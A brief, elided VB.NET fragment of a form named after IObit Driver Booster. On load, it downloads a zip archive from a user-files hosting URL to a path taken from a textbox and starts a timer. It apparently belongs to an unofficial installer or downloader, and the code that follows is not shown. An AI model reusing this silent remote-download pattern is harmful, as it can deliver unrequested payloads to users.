...
Public Class Iobit_Driver_Booster
    ...
    Private Sub Iobit_Driver_Booster_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_addf99a2ff534d84862c06d20865645e.zip"), Texbbb.TextBox7.Text)
        Timer1.Start()
